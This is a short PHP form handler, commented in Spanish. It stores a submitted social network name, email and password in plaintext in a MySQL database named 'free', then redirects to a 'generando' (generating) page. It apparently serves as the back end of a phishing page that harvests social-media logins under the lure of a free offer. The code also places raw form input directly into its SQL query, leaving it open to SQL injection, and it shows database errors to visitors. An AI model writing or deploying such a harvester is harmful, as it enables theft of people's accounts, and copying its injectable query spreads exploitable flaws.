<?php
// Conexión a la base de datos
$servername = "localhost";
$username = "root";
$password = "";
$dbname = "free";

$conn = mysqli_connect($servername, $username, $password, $dbname);

// Verificar si hay error en la conexión
if (!$conn) {
    die("La conexión a la base de datos ha fallado: " . mysqli_connect_error());
}

// Obtener los valores del formulario
$red_social = $_POST['red_social'];
$correo = $_POST['correo'];
$contrasena = $_POST['contrasena'];

// Insertar los valores en la tabla usuarios
$sql = "INSERT INTO usuarios (red, usuario, contraseña) VALUES ('$red_social', '$correo', '$contrasena')";

if (mysqli_query($conn, $sql)) {
    // Redireccionar a otra página
    header("Location: ../generando/generando.html");
    exit();
} else {
    echo "Ha ocurrido un error: " . $sql . "<br>" . mysqli_error($conn);
}

// Cerrar la conexión
mysqli_close($conn);
?>